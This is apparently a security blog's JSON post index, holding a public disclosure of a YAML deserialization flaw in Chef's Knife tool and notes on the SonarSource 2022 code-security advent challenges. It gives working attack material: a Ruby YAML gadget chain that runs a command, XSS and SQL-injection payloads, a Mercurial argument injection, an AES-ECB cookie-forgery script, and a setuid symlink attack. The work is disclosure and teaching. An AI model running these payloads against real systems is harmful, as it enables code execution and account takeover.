[
  
  {
    "title": "Chef Yaml Deserialization Vulnerability",
    "url": "/posts/chef-unsafe-deserialization/",
    "categories": "software security",
    "tags": "yaml",
    "date": "2024-08-30 03:25:52 +0800",
    





    
    "snippet": "YAML (YAML Ain’t Markup Language) is a popular data serialization format used in many programming languages, including Ruby. Insecure deserialization is a security vulnerability that occurs when an...",
    "content": "YAML (YAML Ain’t Markup Language) is a popular data serialization format used in many programming languages, including Ruby. Insecure deserialization is a security vulnerability that occurs when an application deserializes data from an untrusted source and allows an attacker to execute arbitrary code or perform unauthorized actions.In Ruby, YAML deserialization can be exploited if the application blindly loads and processes YAML data without proper validation and sanitization. This can lead to various security risks, including remote code execution (RCE), denial of service (DoS), or data manipulation.I found that the Knife package and Chef package both have APIs that allows Insecure Deserialization.Knife - Within the knife package (chef/knife/yaml_convert.rb#L54), even though you are using yaml.safe_load, on line 54, you are using yaml.load_stream to check the contents of a yaml file, this is vulnerable to insecure deserialisation.   # YAML can contain multiple documents (--- is the separator), let's not support that.    if ::YAML.load_stream(yaml_contents).length &gt; 1      ui.fatal!(\"YAML recipe '#{yaml_file}' contains multiple documents, only one is supported\")    endSo one can provide the command knife yaml convert data.yml results.rb with the data.yml being the below dangerous code (deserialization gadget for ruby 2.x, tested on knife 17.10.0)- !ruby/object:Gem::Installer    i: x- !ruby/object:Gem::SpecFetcher    i: y- !ruby/object:Gem::Requirement  requirements:    !ruby/object:Gem::Package::TarReader    io: &amp;1 !ruby/object:Net::BufferedIO      io: &amp;1 !ruby/object:Gem::Package::TarReader::Entry         read: 0         header: \"abc\"      debug_output: &amp;1 !ruby/object:Net::WriteAdapter         socket: &amp;1 !ruby/object:Gem::RequestSet             sets: !ruby/object:Net::WriteAdapter                 socket: !ruby/module 'Kernel'                 method_id: :system             git_set: id         method_id: :resolveThis will execute the id command successfully.Chef -  same issue also exist in chef (chef/recipe.rb#L89) where you are using yaml.load_stream to check the contents of a yaml file. But i noticed this API is used less so it might be less of a risk. With ruby yaml itself, YAML.load, YAML.load_documents, YAML.load_file and YAML.load_stream all do insecure deserialisation and the safe APIs dont.ImpactThe vulnerability allows code execution. an attacker may craft a malicious YAML payload that includes Ruby objects with specially crafted properties or malicious code embedded within them. When the vulnerable application deserializes this payload using the YAML parser, it may execute the attacker’s code or trigger unintended behaviors.payloads  Universal RCE with Ruby YAML.load (Original)  Universal RCE with Ruby YAML.load (Updated)Disclosure:A hackerone report was submitted to Chef on June 21, 2023, after back and forth, their response on March 25, 2024, 7:14pm UTC wasWe have marked this low because the exploit goes against best practices given to customer (that unverified content is run in DevOps operations), we will likely resolve this through tech debt upgrade. Thank you again for reporting it.If you have additional information to support a change of impact, or have a proof of concept (even if theoretical), please let us know. The next update will be when the fix is planned in a future release for both Chef Workstation and Chef Infra Server.As a note, we are moving to BugCrowd as of the end of the month and you will need to register there to continue getting status and/or file new reports.After that, they removed their bugbounty program from HackeOne and I recieved no further response regarding the fix, or how to follow up with Chef and recieved no invite to their bugcrowd VDP after asking. I decided to publicly disclose this since this was reported almost an year ago and Chef has no interest to fix it."
  },
  
  {
    "title": "Common SAML vulnerabilities and how to remediate them",
    "url": "/posts/saml-security/",
    "categories": "software security",
    "tags": "saml",
    "date": "2023-12-20 03:25:52 +0800",
    





    
    "snippet": "This blog aims to give a short overview of popular SAML vulnerabilities and how they can be remediated with some examples: https://snyk.io/blog/common-saml-vulnerabilities-remediate/",
    "content": "This blog aims to give a short overview of popular SAML vulnerabilities and how they can be remediated with some examples: https://snyk.io/blog/common-saml-vulnerabilities-remediate/"
  },
  
  {
    "title": "Swift Deserialization Security primer",
    "url": "/posts/swift-deserialiation/",
    "categories": "software security",
    "tags": "swift",
    "date": "2023-07-01 03:25:52 +0800",
    





    
    "snippet": "NScoding and NSSecureCoding code related issues are often interesting to review and find. Some work I did regarding this can be found here: https://snyk.io/blog/swift-deserialization-security-primer/",
    "content": "NScoding and NSSecureCoding code related issues are often interesting to review and find. Some work I did regarding this can be found here: https://snyk.io/blog/swift-deserialization-security-primer/"
  },
  
  {
    "title": "SonarSource Advent Security Calendar 2022 Notes",
    "url": "/posts/codesecurity-advent-calendar-2022/",
    "categories": "capture the flag",
    "tags": "ctf",
    "date": "2023-01-02 03:25:52 +0800",
    





    
    "snippet": "Notes related to RipsTech/SonarSource CodeAdvent Security Calendar 2022. Official writeup here: https://www.sonarsource.com/knowledge/code-challenges/advent-calendar-2022/Day 1 - PHP&lt;?phpsession...",
    "content": "Notes related to RipsTech/SonarSource CodeAdvent Security Calendar 2022. Official writeup here: https://www.sonarsource.com/knowledge/code-challenges/advent-calendar-2022/Day 1 - PHP&lt;?phpsession_start();function changePassword($token, $newPassword){    $db = new SQLite3('/srv/users.sqlite', SQLITE3_OPEN_READWRITE);    $p = $db-&gt;prepare('SELECT id FROM users WHERE reset_token = :token');    $p-&gt;bindValue(':token', $token, SQLITE3_TEXT);     $res = $p-&gt;execute()-&gt;fetchArray(1);    if (strlen($token) == 32 &amp;&amp; $res)     {        $p = $db-&gt;prepare('UPDATE users SET password = :password WHERE id = :id');        $p-&gt;bindValue(':password', $newPassword, SQLITE3_TEXT);         $p-&gt;bindValue(':id', $res['id'], SQLITE3_INTEGER);        $p-&gt;execute();        # TODO: notify the user of the new password by email        die('Password changed!');    }    http_response_code(403);    die('Invalid reset token!');}&lt;?phpsession_start();function generatePasswordResetToken($user) {    $db = new SQLite3('/srv/users.sqlite', SQLITE3_OPEN_READWRITE);    $token = md5(mt_rand(1, 100) . $user . time() . session_id());    $p = $db-&gt;prepare('UPDATE users SET reset_token = :token WHERE name = :user');    $p-&gt;bindValue(':user', $user, SQLITE3_TEXT);    $p-&gt;bindValue(':token', $token, SQLITE3_TEXT);    $p-&gt;execute();}  Lack of Unique Token Generation:          Only 100 random numbers are used.      Username and session identifier (PHPSESSID cookie) are known.      Request timestamp can be estimated from response headers.        Vulnerability Exploitation:          Attackers must first trigger a password reset for the target user.      By generating multiple tokens, they can eventually find the correct one.      This could be achieved within a few dozen tries.        Similar Vulnerability in PEAR:          A similar vulnerability was found in the PHP package manager PEAR. - https://blog.sonarsource.com/php-supply-chain-attack-on-pear/      This allowed attackers to take over any user account.      It was exploited in conjunction with a 1-day bug in the Archive_TAR library.      Day 2 - Java// ...HttpServer srv = HttpServer.create(new InetSocketAddress(9000), 0);srv.createContext(\"/\", new HttpHandler() {    @Override    public void handle(HttpExchange he) throws IOException {        String ret = \"&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Comments&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;table&gt;\";        try {            ResultSet rs = statement.executeQuery(\"select * from comments\");            while (rs.next()) {                String comment = rs.getString(\"comment\").replace(\"&lt;\", \"&amp;lt;\").replace(\"&gt;\", \"&amp;gt;\");                ret += \"&lt;tr&gt;&lt;td&gt;\" + Normalizer.normalize(comment, Normalizer.Form.NFKC) + \"&lt;/td&gt;&lt;/tr&gt;\\n\";            }            Main.response(he, 200, ret + \"&lt;/table&gt;&lt;/body&gt;&lt;/html&gt;\");        } catch (Exception exp) {            System.out.println(exp);            Main.response(he, 500, \"Internal Server Error\");        }    }});srv.createContext(\"/comment\", new HttpHandler() {    @Override    public void handle(HttpExchange he) throws IOException {        try {            JSONObject jsonObject = (JSONObject)(new JSONParser()).parse(new InputStreamReader(he.getRequestBody(), \"UTF-8\"));            PreparedStatement stmt = finalConnection.prepareStatement(\"insert into comments values(?)\");            stmt.setString(1, (String)jsonObject.get(\"comment\"));            stmt.executeUpdate();            Main.response(he, 200, \"Ok\");        } catch (Exception exp) {            Main.response(he, 500, \"Internal Server Error\");        }    }});srv.start();  XSS Vulnerability:          User-provided comments are sanitized to prevent XSS.      However, subsequent normalization with Normalizer.normalize() reintroduces the risk.      NFKC normalization allows the injection of &lt; and &gt; characters using Unicode characters U+FE64 and U+FE65.        Exploitable Payload:          {'comment':'\\ufe64script\\ufe65alert(document.domain);\\ufe64/script\\ufe65'}      Example of real world vulnerability: https://blog.sonarsource.com/zimbra-webmail-compromise-via-email/Day 3 - CSharpclass ApiHandler {  public string Call(HttpRequest request, HttpResponse response) {    try    {      if (!Regex.IsMatch(request.Query[\"path\"], \"^[/a-zA-Z0-9_]*\")) {        return \"not allowed!\";      }      var url = \"https://api.github.com\" + request.Query[\"path\"];      var clientHandler = new HttpClientHandler();      clientHandler.AllowAutoRedirect = false;      var client = new HttpClient(clientHandler);      var authHeader = Environment.GetEnvironmentVariable(\"Authorization\");      client.DefaultRequestHeaders.Add(\"Authorization\", authHeader);      Task.Run(() =&gt; client.GetAsync(url));    }    catch (Exception ex) {      return \"error\";    }    return \"request sent\";  }}  Open Redirect Vulnerability in GitHub API:          Issue: Missing trailing slash (/) in https://api.github.com allows manipulation.      Exploit: Attacker can send requests to arbitrary servers using the path parameter in the URL.                  Malicious URL Example: https://api.github.compath=.attacker.com/hello (This redirects to attacker’s server)                    Impact: Leaks the Authorization header, potentially compromising user credentials.        Vulnerability Details:          Regular expression for path parameter: ^[/a-zA-Z0-9_]*                  Allows zero matches (* is a greedy quantifier).                    Attacker Payload: .attacker.com/hello (Bypasses validation due to zero matches).      Day 4 - JSconst express = require('express');const auth = require('./auth');const app = express();app.use((req, res, next) =&gt; {  if (req.url.startsWith('/api')) {    const allowed = auth.checkToken(req);    if (!allowed) {      return res.status(401).send('missing auth token!');    }  }  next();});app.use('/static', express.static('./static'));app.use('/api', require('./api'));app.listen(1337);  Case-Sensitivity Vulnerability in Express Framework:          Issue: Express framework’s routing is case-insensitive by default.      Exploit: Attacker can bypass authentication by capitalizing the /api endpoint.                  Malicious URL Example: /API/users (Accesses protected resource without authentication)                    Impact: Allows unauthorized access to sensitive resources.      Day 5 - Pythoncipher = AES.new(get_random_bytes(16), AES.MODE_ECB)users = [{'usrid': 0, 'name': 'admin', 'pwd': get_random_bytes(16).hex()},         {'usrid': 1, 'name': 'guest', 'pwd': 'guest'}]def gen_cookie(usrid, name):    name = name.replace('\"', '')    return b64encode(cipher.encrypt(pad(f'\\{\\{\"usrid\":\\{int(usrid)\\}, \"name\":\"{name}\"}}'.encode(), 16)))@app.route('/settings', methods=['POST'])def settings():    user = loads(unpad(cipher.decrypt(b64decode(request.cookies.get('session'))), 16))    if user:        resp = make_response(redirect('/settings'))        name = request.form.get('name').replace('\"', '')        for u in users:            if u['usrid'] == user['usrid']: u['name'] = name        resp.set_cookie('session', gen_cookie(user['usrid'], name))        return resp    return redirect('/login')@app.route('/login', methods=['POST'])def login():    user = [u for u in users if u['name'] == request.form.get('name') and u['pwd'] == request.form.get('pwd')]    if len(user) == 1:        resp = make_response(redirect('/settings'))        resp.set_cookie('session', gen_cookie(user[0]['usrid'], user[0]['name']))        return resp    return jsonify({'error': 'invalid credentials'})  Insecure Session Cookie Encryption:          Issue: The application uses AES-ECB for session cookie encryption, which is vulnerable.      Impact: Attackers can potentially forge a valid admin session cookie.        Vulnerability Details:          AES-ECB mode leaks data patterns due to independent block encryption.      Session cookie contains userid and username (partially controllable by user).      Attackers exploit this to create specific encrypted blocks for cookie forgery.        Exploitation Steps:          Change username to specific values to manipulate encrypted blocks.                  Block 1: `”{“ (using application-inserted double quote)          Block 2: \\u0075\\u0073rid (crafted username using unicode for padding)          Block 3: :0 (username with spaces for padding)          Block 4: } (username with spaces)                    Obtain these blocks by sending crafted username requests.      Create an empty block for padding (achieved with another username change).      Concatenate all blocks (including padding) to form a valid admin session cookie.        Example Script:          Provided Python script demonstrates the attack flow (commented).      It retrieves blocks, concatenates them, and gains admin access.      import requestsfrom base64 import b64decode, b64encodeURL = 'http://localhost's = requests.Session()s.post(URL + '/login', data={'name':'guest', 'pwd':'guest'})# 0123456789012345# [xxxxxxxxxxxxxx][xxxxxxxxxxxxxx]# {\"usrid\":1, \"name\":\"guest\"}# [xxxxxxxxxxxxxx][xxxxxxxxxxxxxx][xxxxxxxxxxxxxx][xxxxxxxxxxxxxx]# {\"usrid\":1, \"name\":\"guest                     {\"}s.post(URL + '/settings', data={'name':'guest                     {'})data = b64decode(s.cookies.get('session'))# block1 = '              {\"'block1 = data[0x20:0x30]# [xxxxxxxxxxxxxx][xxxxxxxxxxxxxx][xxxxxxxxxxxxxx][xxxxxxxxxxxxxx]# {\"usrid\":1, \"name\":\"guest       \\u0075\\u0073rid\"}s.post(URL + '/settings', data={'name':'guest       \\\\u0075\\\\u0073rid'})data = b64decode(s.cookies.get('session'))# block2 = '\\u0075\\u0073rid\"'block2 = data[0x20:0x30]# [xxxxxxxxxxxxxx][xxxxxxxxxxxxxx][xxxxxxxxxxxxxx][xxxxxxxxxxxxxx]# {\"usrid\":1, \"name\":\"guest                     :0\"}s.post(URL + '/settings', data={'name':'guest                     :0'})data = b64decode(s.cookies.get('session'))# block3 = '              :0'block3 = data[0x20:0x30]# [xxxxxxxxxxxxxx][xxxxxxxxxxxxxx][xxxxxxxxxxxxxx][xxxxxxxxxxxxxx]# {\"usrid\":1, \"name\":\"guest                      }\"}s.post(URL + '/settings', data={'name':'guest                      }'})data = b64decode(s.cookies.get('session'))# block4 = '               }'block4 = data[0x20:0x30]# last block required for padding# [xxxxxxxxxxxxxx][xxxxxxxxxxxxxx][xxxxxxxxxxxxxx]# {\"usrid\":1, \"name\":\"guest     \"}s.post(URL + '/settings', data={'name':'guest     '})data = b64decode(s.cookies.get('session'))# block5 = '\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10'block5 = data[0x20:0x30]#               [xxxxxxxxxxxxxx][xxxxxxxxxxxxxx][xxxxxxxxxxxxxx][xxxxxxxxxxxxxx]# all_blocks = '              {\"\\u0075\\u0073rid\"              :0               }'# (+ padding)# &gt;&gt;&gt; loads('              {\"\\u0075\\u0073rid\"              :0               }')# {'usrid': 0}c = {'session': b64encode(block1+block2+block3+block4+block5).decode()}j = requests.get(URL + '/settings', cookies=c).json() # admin access  Recommendation:          Use a secure encryption mode like AES-GCM for session cookies.      Day 6 - PHP&lt;?php$db = new SQLite3('/srv/users.sqlite');if(!isset($_POST['mail'])) {    die(\"Need mail.\\n\");}$mail = $_POST['mail'];$filter_chain = array(FILTER_DEFAULT, FILTER_SANITIZE_ADD_SLASHES, FILTER_VALIDATE_EMAIL, FILTER_SANITIZE_STRING);for($i=0; $i &lt; count($filter_chain); $i++){    if(filter_var($mail, $filter_chain[$i]) === false){        die(\"Invalid Email.\\n\");    }}// check if email exists$user = $db-&gt;querySingle(\"SELECT username FROM users WHERE email='$mail' LIMIT 1\");if(!$user){    die('No user found with given email.');}echo sprintf(\"Hello %s we sent you an email ;).\\n\", htmlspecialchars($user, ENT_QUOTES));  SQL Injection Vulnerability:          Issue: $mail variable is validated but not sanitized before use in an SQLite query.      Impact: Attackers can inject malicious SQL statements to extract sensitive data.        Vulnerability Details:          FILTER_VALIDATE_EMAIL allows many special characters, enabling SQL injection.      Attackers can use UNION clause to retrieve additional data (e.g., passwords).        Exploit Example:          Malicious email: '/**/union/**/select/**/password/**/FROM/**/users/*'@a.s      This email bypasses validation and injects SQL, leading to password leakage.        Reference:          Codoforum 4.8.7: Critical Code Vulnerabilities Explained - https://blog.sonarsource.com/codoforum-4.8.7-critical-code-vulnerabilities-explained      Day 7 - JS&lt;script setup&gt;import PageContent from './components/PageContent.vue';&lt;/script&gt;&lt;template&gt;  &lt;main&gt;    &lt;img src=\"@/assets/logo.svg\" class=\"logo\"&gt;    &lt;PageContent      msg=\"You did it!\"      v-bind=\"$route.query\"      class=\"card-lg\"    /&gt;  &lt;/main&gt;&lt;/template&gt;&lt;style&gt;@keyframes spinner {  from { transform: rotate(0deg); }  to { transform: rotate(360deg); }}img.logo {  animation: 5s linear spinner infinite;}&lt;/style&gt;  DOM-Based XSS Vulnerability in Vue.js Application:          Issue: v-bind directive allows dynamic attribute binding, including event handlers.      Impact: Attackers can inject malicious JavaScript into the page, potentially leading to unauthorized actions.        Exploit Details:          Leveraging Vue Router:                  $route.query can be manipulated to control attribute values.          Setting style and onanimationstart attributes enables JavaScript injection.                    Malicious URL:                  http://chal:1337/#/?style=animation-name:spinner&amp;onanimationstart=alert(1)                    Attack Vector:                  When the page loads, the animation triggers the onanimationstart event, executing the malicious JavaScript.                      Reference:          SmartStoreNET - Malicious Message leading to E-Commerce Takeover - https://blog.sonarsource.com/smartstorenet-malicious-message-leading-to-e-commerce-takeover/      Day 8 - PHP&lt;?phpsession_start();function client_ip(){    return !empty($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR'];}$ip = client_ip();if(!filter_var($ip, FILTER_VALIDATE_IP) || !in_array($ip, array('localhost', '127.0.0.1'))){    die(htmlspecialchars(\"Not allowed!\\n\"));}if(!isset($_SESSION['auth'])){    header(\"Location: error.php\");}// interact with API endpointsecho call_user_func($_GET['cmd'], $_GET['arg']);  HTTP Header Manipulation Vulnerability:          Issue: X-Forwarded-For header can be manipulated to bypass IP address restrictions.      Impact: Attackers can potentially execute arbitrary PHP code.        Exploit Details:          Bypass IP Restriction:                  Setting X-Forwarded-For to 127.0.0.1 bypasses the allow-list.                    Ignoring Redirect:                  The client can ignore the redirect, allowing the script to continue execution.                    Code Execution:                  call_user_func() function enables arbitrary PHP code execution.                    Day 9 - Pythondef upload(request):    f = request.FILES[\"data\"]    with open(f'/tmp/storage/{f.name}', 'wb+') as destination:        for chunk in f.chunks(): destination.write(chunk)    return HttpResponse(\"File is uploaded!\")def install(request):    language_name = request.GET['language_name']    if '..' in language_name: return HttpResponse(\"Not allowed!\")    src = os.path.join('contrib', 'languages', language_name)    dst = os.path.join('/tmp/extract', language_name)    shutil.copy(src, dst)    shutil.unpack_archive(dst, extract_dir='/tmp/extract')    return HttpResponse(\"Installed!\")def clean(request):    file = os.path.basename(request.GET['file'])    file_safe = f'/tmp/storage/{file}'    os.unlink(file_safe)    return HttpResponse(\"file removed!\")  Race Condition and Path Traversal Vulnerability:          Issue: os.path.join() is vulnerable to path traversal attacks.      Impact: Attackers can exploit a race condition to write arbitrary files.        Exploit Steps:          Path Traversal Bypass:                  Upload a malicious tar archive (p.tar).          Use language_name=/tmp/storage/p.tar to bypass path traversal checks.                    Race Condition Exploitation:                  Delete the target file (p.tar) using the /clean endpoint.          Re-upload the archive and trigger the /install endpoint simultaneously.                    Arbitrary File Write:                  If the race is successful, the archive is extracted, leading to arbitrary file creation.                      Reference:          10 Unknown Security Pitfalls for Python - https://blog.sonarsource.com/10-unknown-security-pitfalls-for-python/      Day 10 - Java@WebServlet(name = \"MercurialImporterServlet\", urlPatterns = {\"/check\"})public class MercurialImporterServlet extends HttpServlet {    @Override    protected void doPut(HttpServletRequest req, HttpServletResponse res) throws IOException {        res.setContentType(\"text/plain\");        var out = res.getOutputStream();        if (req.getParameter(\"repository\") == null             || req.getParameter(\"repository\").indexOf(\"$(\") != -1             || req.getParameter(\"repository\").indexOf(\"`\") != -1) {            res.setStatus(405);            return;        }        var cmd = new String[] {            \"hg\",            \"identify\",            req.getParameter(\"repository\")        };        var p = Runtime.getRuntime().exec(cmd);        var br = new BufferedReader(new InputStreamReader(p.getInputStream()));        String l;        while ((l = br.readLine()) != null) {            out.write(l.getBytes(\"ascii\"));        }        br.close();    }}  Mercurial Command Injection Vulnerability:          Issue: Lack of proper input validation for Mercurial client arguments.      Impact: Attackers can execute arbitrary shell commands.        Exploit Details:          Mercurial Alias:                  Attackers can create custom aliases using the --config option.          Aliases prefixed with ! execute shell commands.                    Payload Example:                  repository=--config=alias.identify=!id          This payload executes the id command.                      Reference:          PHP Supply Chain Attack on Composer - https://blog.sonarsource.com/php-supply-chain-attack-on-composer/      Securing Developer Tools: A New Supply Chain Attack on PHP - https://blog.sonarsource.com/securing-developer-tools-a-new-supply-chain-attack-on-php/      Day 11 - C// $ ls -lh /opt/logger/bin/// -rwsrwsr-x 1 root root  14K Dec 11 13:37 loggerctlchar *logger_path, *cmd;void rotate_log() {    char log_old[PATH_MAX], log_new[PATH_MAX], timestamp[0x100];    time_t t;    time(&amp;t);    strftime(timestamp, sizeof(timestamp), \"%FT%T\", gmtime(&amp;t));    snprintf(log_old, sizeof(log_old), \"%s/../logs/global.log\", logger_path);    snprintf(log_new, sizeof(log_new), \"%s/../logs/global-%s.log\", logger_path, timestamp);    execl(\"/bin/cp\", \"/bin/cp\", \"-a\", \"--\", log_old, log_new, NULL);}int main(int argc, char **argv) {    if (argc != 2) {        printf(\"Usage: /opt/logger/bin/loggerctl &lt;cmd&gt;\\n\");        return 1;    }    if (setuid(0) == -1) return 1;    if (seteuid(0) == -1) return 1;    char *executable_path = argv[0];    logger_path = dirname(executable_path);    cmd = argv[1];    if (!strcmp(cmd, \"rotate\")) rotate_log();    else list_commands();    return 0;}Vulnerability: Setuid Binary with Path TraversalImpact: Arbitrary file write as rootExploit:  Create a malicious directory structure:          /tmp/fakedir/bin/dummy - A dummy executable      /tmp/fakedir/logs/global.log - File containing malicious content      /tmp/fakedir/logs/global-YYYY-MM-DDTHH:MM:SS.log - Symbolic link pointing to the target file (e.g., /root/.ssh/authorized_keys)        Execute the loggerctl binary:          Use a crafted C program (or similar) to execute loggerctl with a manipulated argv[0]:        #include &lt;unistd.h&gt;void main() {    execl(\"/opt/logger/bin/loggerctl\", \"/tmp/fakedir/bin/dummy\", \"rotate\", NULL);}                      Trigger the vulnerability:          The loggerctl binary will attempt to copy global.log to global-YYYY-MM-DDTHH:MM:SS.log.      Due to the symbolic link, the malicious content will be written to the target file.      Key Points:  The setuid bit allows the binary to run with root privileges.  Path traversal vulnerability in argv[0] allows control over file paths.  Symbolic links enable writing to arbitrary files.By exploiting this vulnerability, an attacker can gain root privileges on the system.Day 12 - JS&lt;!-- oauth-popup.html --&gt;&lt;script&gt;const handlers = Object.assign(Object.create(null), {  getAuthCode(sender) {    sender.postMessage({      type: 'auth-code',      code: new URL(location).searchParams.get('code'),    }, '*');  },  startAuthFlow(sender, clientId) {    location.href = 'https://github.com/login/oauth/authorize'        + '?client_id=' + encodeURIComponent(clientId)        + '&amp;redirect_uri=' + encodeURIComponent(location.href);  },});window.addEventListener('message', ({ source, origin, data }) =&gt; {  if (source !== window.opener) return;  if (origin !== window.origin) return;  handlers[data.cmd](source, ...data.args);});window.opener.postMessage({ type: 'popup-loaded' }, '*');&lt;/script&gt;Vulnerability: Null Origin Bypass in GitHub OAuth PopupProblem:The popup uses window.origin to validate messages. However, window.origin can be manipulated to null when a page is embedded in a sandboxed iframe. This allows attackers to send malicious messages to the popup and potentially steal sensitive information, such as OAuth tokens.Exploit:  Create a Malicious Page:          Create a web page with a sandboxed iframe.      The iframe should have the allow-scripts and allow-popups attributes to enable script execution and popup creation.        Open the OAuth Popup:          The malicious page opens the victim’s OAuth popup within the sandboxed iframe.      Due to the sandbox, the popup inherits the null origin of the iframe.        Send Malicious Messages:          The attacker’s script sends malicious messages to the popup using postMessage.      The popup, believing the messages are from a legitimate source, processes them.        Steal OAuth Token:          The attacker’s script can trick the popup into revealing the OAuth token.      This is achieved by sending commands to the popup, such as requesting the token or triggering specific actions.      Mitigation:  Use location.origin:          The popup should use location.origin instead of window.origin for origin validation.      location.origin is more reliable as it cannot be manipulated by sandboxing.        Target Specific Origins:          When using postMessage, the target origin should be explicitly specified.      This prevents messages from being received by unintended recipients.      Day 13 - JavaHttpServer srv = HttpServer.create(new InetSocketAddress(1337), 0);srv.createContext(\"/register\", he - &gt; {    try {        JSONObject params = Server.getParams(he);        String username = (String) params.get(\"username\");        String password = (String) params.get(\"password\");        if (username == null || password == null) {            Server.response(he, 500, \"Internal Server Error\");            return;        }        if (Server.user_exists(conn, username)) {            Server.response(he, 403, \"user exists\");            return;        }        ResultSet rs = smt.executeQuery(\"SELECT password FROM users\");        while (rs.next()) {            if (rs.getString(\"password\").startsWith(password)) {                Server.response(he, 403, \"password policy not followed\");                return;            }        }    } catch (ParseException | SQLException e) {        Server.response(he, 500, \"Internal Server Error\");        return;    }});srv.start();  Vulnerability: A new user registration process is vulnerable to a side-channel attack.  Attack Method:          Attackers register new users with passwords starting with different character sequences.      By observing the error messages (whether “password policy not followed” or successful registration), attackers can infer information about existing passwords.      This is because the password comparison function startswith() leaks information about the matching prefix of the new password with existing passwords.        Impact:          Attackers can potentially extract existing passwords character by character.      This could lead to unauthorized access to accounts and sensitive information.        Mitigation:          Implement a more secure password comparison algorithm that does not leak information about password prefixes.      Consider using a cryptographic hash function to store passwords securely and compare hashes instead of plain text passwords.      Regularly review and update security practices to address emerging threats.      Day 14 - PHP&lt;?phpconst LEAK_ME = '/key.pem';function debugCertificate(){       if (!array_key_exists('cert', $_POST)) {        die('Please provide your certificate!');    }    if (strstr($_POST['cert'], 'BEGIN PUBLIC')) {        $res = openssl_pkey_get_public($_POST['cert']);    } else {        $res = openssl_pkey_get_private($_POST['cert']);    }    $res = openssl_pkey_get_details($res);    echo 'Here is your key:&lt;br&gt;&lt;pre&gt;' . serialize($res) . '&lt;/pre&gt;';}  Vulnerability: The PHP OpenSSL extension is vulnerable to a path traversal attack.  Attack Method:          Attackers can exploit the file:// prefix to read arbitrary files on the server.      By crafting a malicious request with a specially crafted $_POST['key'] parameter, attackers can access sensitive files like private keys.        Impact:          Attackers can potentially steal sensitive information, including private keys.      This could lead to unauthorized access to systems and data.        Mitigation:          Validate and sanitize user input to prevent malicious input from being processed.      Implement proper input validation and filtering to block file paths and other malicious input.      Keep software and libraries up-to-date with the latest security patches.      Consider using a web application firewall (WAF) to protect against common web attacks, including path traversal.      Day 15 - Pythonapp = Flask(__name__)app.config['TEMPLATES_AUTO_RELOAD'] = TrueSession(app)users = {'guest':'guest'}@app.route('/login', methods=['GET', 'POST'])def login():    # ... do login ...@app.route('/register', methods=['GET', 'POST'])def register():    if request.method == 'POST':        username = request.form.get('username')        if username in users:            return render_template('error.html', msg='Username already taken!', return_to='/register')        users[username] = request.form.get('password')        return redirect('/login')    return render_template('register.html')@app.route('/notes', methods=['GET', 'POST'])def notes():    if not session.get('username'): return redirect('/login')    notes_file = 'notes/' + session.get('username')    if commonpath((app.root_path, abspath(notes_file))) != app.root_path:        return render_template('error.html', msg='Error processing notes file!', return_to='/notes')    if request.method == 'POST':        with open(notes_file, 'w') as f: f.write(request.form.get('notes'))        return redirect('/notes')    notes = ''    if exists(notes_file):        with open(notes_file, 'r') as f: notes = f.read()    return render_template('notes.html', username=session.get('username'), notes=notes)  Path Traversal Vulnerability:          The application constructs file paths using user-provided usernames.      This allows attackers to manipulate the path to access and modify files outside the intended directory.      By registering a user with a crafted username (e.g., ../templates/error.html), attackers can overwrite template files.        Server-Side Template Injection (SSTI) Vulnerability:          The application uses template auto-reloading, which can be exploited to inject malicious code into templates.      Overwriting the error.html template with a payload allows attackers to execute arbitrary code on the server.      The payload can leverage built-in Python functions to execute system commands or access sensitive information.        Potential Impact:          Data Exfiltration: Attackers can steal sensitive data from the server.      System Compromise: Attackers can execute arbitrary code on the server, potentially leading to full system compromise.      Denial of Service: Attackers can disrupt the application’s functionality by overwriting critical files.      Day 16 - Pythondef _git(cmd, args, cwd='/'):    proc = run(['git', cmd, *args],               stdout=PIPE,               stderr=DEVNULL,               cwd=cwd,               timeout=5)    return proc.stdout.decode().strip()@app.route('/blame', methods=['POST'])def blame():    url = request.form.get('url',                           'https://github.com/package-url/purl-spec.git')    what = request.form.getlist('what[]')    with TemporaryDirectory() as local:        if not url.startswith(('https://', 'http://')):            return make_response('Invalid url!', 403)        _git('clone', ['--', url, local])        res = []        for i in what:            file, lines = i.split(':')            res.append(_git('blame', ['-L', lines, file], local))        return make_response('\\n'.join(res), 200)* Involves invoking `git` in an untrusted folder for arbitrary code execution* Requires control over repository configuration (not applicable here)* Argument injection vulnerability in `git blame`* Exploits undocumented `--output` parameter (similar to other `git` commands)* Creates or truncates files with limited control* Truncating `.git/HEAD` invalidates the local repository* Git searches for a valid repository elsewhere (including planted configurations)* Subsequent `git blame` calls might use the malicious configurationChallenge based on [https://blog.sonarsource.com/securing-developer-tools-git-integrations/]Day 17 - JavaMain.javaHttpServer srv = HttpServer.create(new InetSocketAddress(9000), 0);srv.createContext(\"/\", new HttpHandler() {    @Override    public void handle(HttpExchange he) throws IOException {        String comments = \"&lt;!DOCTYPE html&gt;\\n&lt;html&gt;&lt;head&gt;&lt;title&gt;Comments&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;table&gt;\";        try (Statement stmt = Main.conn.createStatement()) {            ResultSet rs = stmt.executeQuery(\"SELECT * FROM comments\");            while (rs.next()) {                comments += \"&lt;tr&gt;&lt;td&gt;\" + rs.getString(\"comment\") + \"&lt;/td&gt;&lt;/tr&gt;\";            }        } catch (SQLException e) {            Main.response(he, 500, \"Internal Server Error\");        }        Main.response(he, 200, comments + \"&lt;/table&gt;&lt;/body&gt;&lt;/html&gt;\");    }});srv.createContext(\"/comment\", new HttpHandler() {    @Override    public void handle(HttpExchange he) throws IOException {        try (var stmt = Main.conn.prepareStatement(\"INSERT INTO comments (comment) VALUES (?)\")) {            Source comment =  new StreamSource(he.getRequestBody());            Source xslt = new StreamSource(Thread.currentThread().getContextClassLoader().getResourceAsStream(\"comment.xslt\"));            TransformerFactory tf = TransformerFactory.newInstance();            tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, \"\");            tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, \"\");            Transformer transformer = tf.newTransformer(xslt);            StringWriter writer = new StringWriter();            transformer.transform(comment, new StreamResult(writer));            stmt.setString(1, writer.getBuffer().toString());            stmt.executeUpdate();            Main.response(he, 200, \"Ok\");        } catch (Exception e) {            Main.response(he, 500, \"Internal Server Error\");        }    